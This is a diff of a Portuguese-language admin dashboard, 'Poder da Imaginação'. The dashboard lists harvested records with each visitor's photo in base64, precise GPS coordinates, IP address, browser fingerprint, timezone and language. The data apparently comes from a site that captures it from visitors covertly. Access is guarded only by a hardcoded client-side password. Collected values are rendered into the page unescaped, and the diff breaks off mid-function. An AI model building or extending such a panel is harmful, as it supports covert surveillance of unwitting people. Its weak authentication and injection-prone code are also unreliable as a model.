@@ -5,428 +5,123 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin • Poder da Imaginação</title>
     <style>
-        /* ============================================================
-           RESET E BASE
-           ============================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:ital@0;1&display=swap');
-
-        :root {
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #14141e;
-            --bg-card: #1a1a2e;
-            --bg-card-hover: #22223a;
-            --text-primary: #f0ece4;
-            --text-secondary: #a8a0b8;
-            --text-muted: #6a6a82;
-            --accent: #c9b084;
-            --accent-hover: #d4c0a0;
-            --border: rgba(255,255,255,0.06);
-            --radius: 12px;
-            --shadow: 0 20px 60px rgba(0,0,0,0.6);
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0f;
+            color: #f0ece4;
             min-height: 100vh;
             padding: 20px;
         }
+        .container { max-width: 1200px; margin: 0 auto; }
 
-        /* ============================================================
-           LAYOUT
-           ============================================================ */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        /* ============================================================
-           HEADER
-           ============================================================ */
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 24px 0;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 32px;
-            flex-wrap: wrap;
-            gap: 16px;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .header-left .logo {
-            font-family: 'Playfair Display', serif;
-            font-size: 22px;
-            color: var(--accent);
-            font-style: italic;
-        }
-
-        .header-left .logo span {
-            color: var(--text-primary);
-            font-style: normal;
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .header-right .badge {
-            font-size: 11px;
-            color: var(--text-muted);
-            background: var(--bg-card);
-            padding: 4px 12px;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-        }
-
-        .header-right .logout {
-            font-size: 12px;
-            color: var(--text-muted);
-            background: none;
-            border: 1px solid var(--border);
-            padding: 6px 16px;
-            border-radius: 20px;
-            color: var(--text-secondary);
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .header-right .logout:hover {
-            background: var(--bg-card);
-            border-color: rgba(255,255,255,0.1);
-        }
-
-        /* ============================================================
-           LOGIN OVERLAY
-           ============================================================ */
         .login-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.8);
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.9);
             backdrop-filter: blur(20px);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 1000;
         }
-
-        .login-overlay.hidden {
-            display: none;
-        }
-
+        .login-overlay.hidden { display: none; }
         .login-box {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
+            background: #14141e;
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
             padding: 40px;
             max-width: 380px;
             width: 100%;
-            box-shadow: var(--shadow);
         }
-
-        .login-box h2 {
-            font-family: 'Playfair Display', serif;
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-            color: var(--text-primary);
-        }
-
-        .login-box p {
-            color: var(--text-secondary);
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-
+        .login-box h2 { font-size: 24px; margin-bottom: 8px; color: #c9b084; }
+        .login-box p { color: #a8a0b8; font-size: 14px; margin-bottom: 24px; }
         .login-box input {
-            width: 100%;
-            padding: 12px 16px;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 14px;
-            font-family: 'Inter', sans-serif;
-            margin-bottom: 16px;
-            transition: border-color 0.3s ease;
+            width: 100%; padding: 12px 16px;
+            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px; color: #f0ece4; font-size: 14px; margin-bottom: 16px;
         }
-
-        .login-box input:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
+        .login-box input:focus { outline: none; border-color: #c9b084; }
         .login-box button {
-            width: 100%;
-            padding: 12px;
-            background: var(--accent);
-            border: none;
-            border-radius: 8px;
-            color: #0a0a0f;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s ease;
-            font-family: 'Inter', sans-serif;
+            width: 100%; padding: 12px;
+            background: #c9b084; border: none;
+            border-radius: 8px; color: #0a0a0f;
+            font-size: 14px; font-weight: 600; cursor: pointer;
         }
+        .login-box button:hover { background: #d4c0a0; }
+        .login-box .error-msg { color: #f87171; font-size: 12px; margin-top: 12px; display: none; }
+        .login-box .error-msg.visible { display: block; }
 
-        .login-box button:hover {
-            background: var(--accent-hover);
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.06);
+            margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
         }
-
-        .login-box .error-msg {
-            color: #f87171;
-            font-size: 12px;
-            margin-top: 12px;
-            display: none;
+        .header .logo { font-size: 20px; color: #c9b084; font-weight: 300; }
+        .header .badge {
+            font-size: 12px; color: #6a6a82;
+            background: #1a1a2e; padding: 4px 12px; border-radius: 20px;
         }
-
-        .login-box .error-msg.visible {
-            display: block;
+        .header .logout {
+            background: none; border: 1px solid rgba(255,255,255,0.06);
+            padding: 6px 16px; border-radius: 20px;
+            color: #a8a0b8; cursor: pointer; font-size: 12px;
         }
+        .header .logout:hover { background: #1a1a2e; }
 
-        /* ============================================================
-           ESTATÍSTICAS
-           ============================================================ */
         .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-            gap: 16px;
-            margin-bottom: 32px;
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px; margin-bottom: 24px;
         }
-
         .stat-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            text-align: center;
+            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px; padding: 16px; text-align: center;
         }
+        .stat-card .number { font-size: 24px; font-weight: 600; color: #f0ece4; }
+        .stat-card .label { font-size: 11px; color: #6a6a82; margin-top: 4px; text-transform: uppercase; }
 
-        .stat-card .number {
-            font-size: 28px;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        .stat-card .label {
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-top: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        /* ============================================================
-           LISTA DE COLETAS
-           ============================================================ */
-        .section-title {
-            font-size: 16px;
-            font-weight: 500;
-            color: var(--text-secondary);
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .section-title .count {
-            font-size: 12px;
-            color: var(--text-muted);
-            font-weight: 400;
-        }
-
-        .coletas-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
+        .section-title { font-size: 14px; color: #a8a0b8; margin-bottom: 12px; }
         .coleta-item {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 16px 20px;
-            transition: all 0.3s ease;
-            cursor: default;
+            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px; padding: 14px 16px; margin-bottom: 8px;
         }
-
-        .coleta-item:hover {
-            background: var(--bg-card-hover);
-            border-color: rgba(255,255,255,0.08);
-        }
-
         .coleta-item .row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 8px;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 8px;
         }
-
-        .coleta-item .row .left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
+        .coleta-item .id { font-size: 11px; color: #6a6a82; font-family: monospace; }
+        .coleta-item .timestamp { font-size: 12px; color: #6a6a82; }
+        .coleta-item .local { font-size: 12px; color: #a8a0b8; }
+        .coleta-item .has-foto { font-size: 10px; padding: 2px 8px; border-radius: 10px; background: rgba(74,222,128,0.1); color: #4ade80; border: 1px solid rgba(74,222,128,0.15); }
+        .coleta-item .no-foto { font-size: 10px; padding: 2px 8px; border-radius: 10px; background: rgba(248,113,113,0.1); color: #f87171; border: 1px solid rgba(248,113,113,0.15); }
+        .coleta-item .toggle {
+            background: none; border: none; color: #6a6a82;
+            cursor: pointer; font-size: 11px; padding: 4px 8px;
         }
-
-        .coleta-item .id {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-
-        .coleta-item .timestamp {
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-
-        .coleta-item .localizacao {
-            font-size: 13px;
-            color: var(--text-secondary);
-        }
-
-        .coleta-item .has-foto {
-            font-size: 11px;
-            padding: 2px 10px;
-            border-radius: 12px;
-            background: rgba(74, 222, 128, 0.1);
-            color: #4ade80;
-            border: 1px solid rgba(74, 222, 128, 0.15);
-        }
-
-        .coleta-item .no-foto {
-            font-size: 11px;
-            padding: 2px 10px;
-            border-radius: 12px;
-            background: rgba(248, 113, 113, 0.1);
-            color: #f87171;
-            border: 1px solid rgba(248, 113, 113, 0.15);
-        }
-
+        .coleta-item .toggle:hover { color: #a8a0b8; }
         .coleta-item .details {
-            margin-top: 10px;
-            font-size: 12px;
-            color: var(--text-muted);
-            display: none;
-            padding-top: 10px;
-            border-top: 1px solid var(--border);
+            margin-top: 10px; padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            font-size: 12px; display: none;
         }
-
-        .coleta-item .details.visible {
-            display: block;
-            animation: fadeSlideIn 0.3s ease;
+        .coleta-item .details.visible { display: block; }
+        .coleta-item .details .row {
+            display: flex; justify-content: space-between; padding: 4px 0; font-size: 11px;
         }
+        .coleta-item .details .row .label { color: #6a6a82; }
+        .coleta-item .details .row .value { color: #a8a0b8; max-width: 60%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
-        .coleta-item .details .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 4px 0;
-        }
+        .loading-state, .empty-state { text-align: center; padding: 40px 0; color: #6a6a82; font-size: 14px; }
+        .empty-state .icon { font-size: 32px; margin-bottom: 12px; opacity: 0.5; }
 
-        .coleta-item .details .detail-row .label {
-            color: var(--text-muted);
-        }
-
-        .coleta-item .details .detail-row .value {
-            color: var(--text-secondary);
-            max-width: 60%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .coleta-item .toggle-details {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            cursor: pointer;
-            font-size: 12px;
-            font-family: 'Inter', sans-serif;
-            padding: 4px 8px;
-            border-radius: 4px;
-            transition: all 0.3s ease;
-        }
-
-        .coleta-item .toggle-details:hover {
-            background: var(--bg-primary);
-            color: var(--text-secondary);
-        }
-
-        @keyframes fadeSlideIn {
-            0% { opacity: 0; transform: translateY(-4px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ============================================================
-           LOADING / EMPTY
-           ============================================================ */
-        .loading-state, .empty-state {
-            text-align: center;
-            padding: 40px 0;
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-
-        .empty-state .icon {
-            font-size: 32px;
-            margin-bottom: 12px;
-            opacity: 0.5;
-        }
-
-        /* ============================================================
-           RESPONSIVIDADE
-           ============================================================ */
         @media (max-width: 600px) {
-            .header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .header-right {
-                width: 100%;
-                justify-content: space-between;
-            }
-            .stats {
-                grid-template-columns: 1fr 1fr;
-            }
-            .coleta-item .row {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .coleta-item .row .left {
-                width: 100%;
-            }
+            .header { flex-direction: column; align-items: flex-start; }
+            .stats { grid-template-columns: 1fr 1fr; }
+            .coleta-item .row { flex-direction: column; align-items: flex-start; }
         }
-
-        /* ============================================================
-           SCROLLBAR
-           ============================================================ */
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: var(--bg-primary); }
-        ::-webkit-scrollbar-thumb { background: var(--bg-card); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--bg-card-hover); }
     </style>
 </head>
 <body>
 
-    <!-- ===== LOGIN OVERLAY ===== -->
     <div class="login-overlay" id="loginOverlay">
         <div class="login-box">
             <h2>✦ Acesso Restrito</h2>
@@ -437,67 +132,32 @@
         </div>
     </div>
 
-    <!-- ===== CONTEÚDO PRINCIPAL ===== -->
     <div class="container" id="mainContent" style="display:none;">
-
-        <!-- HEADER -->
         <div class="header">
-            <div class="header-left">
-                <div class="logo">✦ Poder da <span>Imaginação</span></div>
-            </div>
-            <div class="header-right">
+            <div class="logo">✦ Poder da Imaginação</div>
+            <div style="display:flex;align-items:center;gap:12px;">
                 <span class="badge" id="totalColetas">0 coletas</span>
                 <button class="logout" id="logoutBtn">Sair</button>
             </div>
         </div>
 
-        <!-- STATS -->
         <div class="stats">
-            <div class="stat-card">
-                <div class="number" id="statTotal">0</div>
-                <div class="label">Total de Coletas</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="statComFoto">0</div>
-                <div class="label">Com Foto</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="statComLocal">0</div>
-                <div class="label">Com Localização</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="statHoje">0</div>
-                <div class="label">Hoje</div>
-            </div>
+            <div class="stat-card"><div class="number" id="statTotal">0</div><div class="label">Total</div></div>
+            <div class="stat-card"><div class="number" id="statComFoto">0</div><div class="label">Com Foto</div></div>
+            <div class="stat-card"><div class="number" id="statComLocal">0</div><div class="label">Com Local</div></div>
+            <div class="stat-card"><div class="number" id="statHoje">0</div><div class="label">Hoje</div></div>
         </div>
 
-        <!-- LISTA -->
-        <div class="section-title">
-            📋 Histórico de Coletas
-            <span class="count" id="countLabel">carregando...</span>
-        </div>
-
+        <div class="section-title">📋 Histórico de Coletas <span class="badge" id="countLabel">carregando...</span></div>
         <div class="coletas-list" id="coletasList">
             <div class="loading-state">⏳ Carregando dados...</div>
         </div>
     </div>
 
-    <!-- ============================================================
-    JAVASCRIPT - ADMIN
-    ============================================================ -->
     <script>
         (function() {
-            'use strict';
+            const SENHA_ADMIN = 'imaginacao2026';
 
-            // ============================================================
-            // CONFIGURAÇÕES
-            // ============================================================
-            const SENHA_ADMIN = 'imaginacao2026'; // ← MUDE A SENHA AQUI!
-            const ADMIN_URL = '/.netlify/functions/admin';
-
-            // ============================================================
-            // DOM
-            // ============================================================
             const loginOverlay = document.getElementById('loginOverlay');
             const senhaInput = document.getElementById('senhaInput');
             const loginBtn = document.getElementById('loginBtn');
@@ -512,12 +172,8 @@
             const statHoje = document.getElementById('statHoje');
             const countLabel = document.getElementById('countLabel');
 
-            // ============================================================
-            // FUNÇÕES DE AUTENTICAÇÃO
-            // ============================================================
             function fazerLogin() {
-                const senha = senhaInput.value.trim();
-                if (senha === SENHA_ADMIN) {
+                if (senhaInput.value === SENHA_ADMIN) {
                     loginOverlay.classList.add('hidden');
                     mainContent.style.display = 'block';
                     loginError.classList.remove('visible');
@@ -537,26 +193,26 @@
                 senhaInput.focus();
             }
 
-            // ============================================================
-            // CARREGAR DADOS DA API
-            // ============================================================
             async function carregarDados() {
                 coletasList.innerHTML = '<div class="loading-state">⏳ Carregando dados...</div>';
 
                 try {
-                    const response = await fetch(ADMIN_URL);
-                    if (!response.ok) throw new Error('Erro ao carregar dados');
+                    console.log('📊 Buscando dados em:', '/api/admin');
+                    const response = await fetch('/api/admin');
+                    if (!response.ok) throw new Error('HTTP ' + response.status);
                     const data = await response.json();
+                    console.log('📊 Dados recebidos:', data);
 
-                    if (data.total === 0) {
+                    if (!data.arquivos || data.arquivos.length === 0) {
                         coletasList.innerHTML = `
                             <div class="empty-state">
                                 <div class="icon">🌿</div>
                                 <div>Nenhuma coleta registrada ainda.</div>
-                                <div style="font-size:12px;margin-top:4px;">As primeiras folhas estão começando a cair...</div>
+                                <div style="font-size:12px;margin-top:4px;">Acesse o site principal para começar.</div>
                             </div>
                         `;
                         countLabel.textContent = '0 coletas';
+                        atualizarStats([]);
                         return;
                     }
 
@@ -564,20 +220,18 @@
                     atualizarStats(data.arquivos);
 
                 } catch (error) {
-                    console.error('Erro ao carregar:', error);
+                    console.error('❌ Erro ao carregar:', error);
                     coletasList.innerHTML = `
                         <div class="empty-state">
                             <div class="icon">⚠️</div>
                             <div>Erro ao carregar dados.</div>
-                            <div style="font-size:12px;margin-top:4px;">Tente novamente mais tarde.</div>
+                            <div style="font-size:12px;margin-top:4px;">${error.message}</div>
+                            <div style="font-size:11px;margin-top:8px;color:#4a4a62;">Tente recarregar a página.</div>
                         </div>
                     `;
                 }
             }
 
-            // ============================================================
-            // RENDERIZAR COLETAS
-            // ============================================================
             function renderizarColetas(arquivos) {
                 countLabel.textContent = arquivos.length + ' coletas';
 
@@ -589,69 +243,30 @@
                     const temFoto = !!dados.foto;
                     const temLocal = !!(local.latitude && local.longitude);
 
-                    const lat = local.latitude ? local.latitude.toFixed(6) : '—';
-                    const lon = local.longitude ? local.longitude.toFixed(6) : '—';
-
                     html += `
                         <div class="coleta-item" data-index="${index}">
                             <div class="row">
-                                <div class="left">
+                                <div>
                                     <span class="id">#${dados.id ? dados.id.substring(0,8) : '—'}</span>
                                     <span class="timestamp">${formatarData(dados.timestamp)}</span>
-                                    ${temFoto ? '<span class="has-foto">📸 Foto</span>' : '<span class="no-foto">📸 Sem foto</span>'}
-                                    ${temLocal ? `<span class="localizacao">📍 ${lat}, ${lon}</span>` : ''}
                                 </div>
-                                <div>
-                                    <button class="toggle-details" data-index="${index}">▾ Detalhes</button>
+                                <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+                                    ${temFoto ? '<span class="has-foto">📸 Foto</span>' : '<span class="no-foto">📸 Sem foto</span>'}
+                                    ${temLocal ? `<span class="local">📍 ${local.latitude.toFixed(4)}, ${local.longitude.toFixed(4)}</span>` : ''}
+                                    <button class="toggle" data-index="${index}">▾ Detalhes</button>
                                 </div>
                             </div>
                             <div class="details" id="details-${index}">
-                                <div class="detail-row">
-                                    <span class="label">ID completo</span>
-                                    <span class="value">${dados.id || '—'}</span>
-                                </div>
-                                <div class="detail-row">
-                                    <span class="label">Data/Hora</span>
-                                    <span class="value">${formatarDataCompleta(dados.timestamp)}</span>
-                                </div>
-                                ${local.latitude ? `
-                                <div class="detail-row">
-                                    <span class="label">Latitude</span>
-                                    <span class="value">${local.latitude}</span>
-                                </div>
-                                <div class="detail-row">
-                                    <span class="label">Longitude</span>
-                                    <span class="value">${local.longitude}</span>
-                                </div>
-                                <div class="detail-row">
-                                    <span class="label">Precisão</span>
-                                    <span class="value">${local.precisao ? local.precisao + 'm' : '—'}</span>
-                                </div>
-                                ` : ''}
-                                <div class="detail-row">
-                                    <span class="label">Navegador</span>
-                                    <span class="value">${navegador.userAgent ? navegador.userAgent.substring(0,60) + '...' : '—'}</span>
-                                </div>
-                                <div class="detail-row">
-                                    <span class="label">Timezone</span>
-                                    <span class="value">${navegador.timezone || '—'}</span>
-                                </div>
-                                <div class="detail-row">
-                                    <span class="label">Idioma</span>
-                                    <span class="value">${navegador.language || '—'}</span>
-                                </div>
-                                ${dados.ip ? `
-                                <div class="detail-row">
-                                    <span class="label">IP</span>
-                                    <span class="value">${dados.ip}</span>
-                                </div>
-                                ` : ''}
-                                ${dados.foto ? `
-                                <div class="detail-row">
-                                    <span class="label">Foto (Base64)</span>
-                                    <span class="value" style="font-size:10px;max-width:70%;">${dados.foto.substring(0,60)}...</span>
-                                </div>
-                                ` : ''}
+                                <div class="row"><span class="label">ID</span><span class="value">${dados.id || '—'}</span></div>
+                                <div class="row"><span class="label">Data/Hora</span><span class="value">${formatarDataCompleta(dados.timestamp)}</span></div>
+                                ${local.latitude ? `<div class="row"><span class="label">Latitude</span><span class="value">${local.latitude}</span></div>` : ''}
+                                ${local.longitude ? `<div class="row"><span class="label">Longitude</span><span class="value">${local.longitude}</span></div>` : ''}
+                                ${local.precisao ? `<div class="row"><span class="label">Precisão</span><span class="value">${local.precisao}m</span></div>` : ''}
+                                <div class="row"><span class="label">Navegador</span><span class="value">${navegador.userAgent ? navegador.userAgent.substring(0,50) + '...' : '—'}</span></div>
+                                <div class="row"><span class="label">Timezone</span><span class="value">${navegador.timezone || '—'}</span></div>
+                                <div class="row"><span class="label">Idioma</span><span class="value">${navegador.language || '—'}</span></div>
+                                ${dados.ip ? `<div class="row"><span class="label">IP</span><span class="value">${dados.ip}</span></div>` : ''}
+                                ${dados.foto ? `<div class="row"><span class="label">Foto</span><span class="value" style="font-size:10px;max-width:70%;">${dados.foto.substring(0,50)}...</span></div>` : ''}
                             </div>
                         </div>
                     `;
@@ -659,8 +274,7 @@
 
                 coletasList.innerHTML = html;
 
-                // Event listeners para toggle de detalhes
-                document.querySelectorAll('.toggle-details').forEach(btn => {
+                document.querySelectorAll('.toggle').forEach(btn => {
                     btn.addEventListener('click', function() {
                         const idx = this.dataset.index;
                         const details = document.getElementById('details-' + idx);
@@ -670,76 +284,4 @@
                 });
             }
 
-            // ============================================================
-            // ATUALIZAR STATS
-            // ============================================================
-            function atualizarStats(arquivos) {
-                const total = arquivos.length;
-                let comFoto = 0, comLocal = 0, hoje = 0;
-                const hojeStr = new Date().toISOString().split('T')[0];
-
-                arquivos.forEach(item => {
-                    const dados = item.conteudo || {};
-                    if (dados.foto) comFoto++;
-                    if (dados.localizacao && dados.localizacao.latitude) comLocal++;
-
-                    if (dados.timestamp && dados.timestamp.startsWith(hojeStr)) {
-                        hoje++;
-                    }
-                });
-
-                statTotal.textContent = total;
-                statComFoto.textContent = comFoto;
-                statComLocal.textContent = comLocal;
-                statHoje.textContent = hoje;
-                totalColetas.textContent = total + ' coletas';
-            }
-
-            // ============================================================
-            // FORMATADORES
-            // ============================================================
-            function formatarData(timestamp) {
-                if (!timestamp) return '—';
-                const d = new Date(timestamp);
-                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
-            }
-
-            function formatarDataCompleta(timestamp) {
-                if (!timestamp) return '—';
-                const d = new Date(timestamp);
-                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit',
-                    minute: '2-digit', second: '2-digit' });
-            }
-
-            // ============================================================
-            // EVENTOS
-            // ============================================================
-            loginBtn.addEventListener('click', fazerLogin);
-            senhaInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') fazerLogin();
-            });
-            logoutBtn.addEventListener('click', fazerLogout);
-
-            // Foca no input de senha ao carregar
-            setTimeout(() => senhaInput.focus(), 300);
-
-            // ============================================================
-            // RECARREGAR AUTOMÁTICO A CADA 30s
-            // ============================================================
-            if (mainContent.style.display !== 'none') {
-                setInterval(carregarDados, 30000);
-            }
-
-            // Se já estiver logado (recarregar página), mantém
-            // O login é controlado pela overlay
-
-            // ============================================================
-            // EXPÕE PARA DEBUG
-            // ============================================================
-            window.__admin = { carregarDados, fazerLogin, fazerLogout };
-
-        })();
-    </script>
-
-</body>
-</html>
+            function atualizarStats(arqu
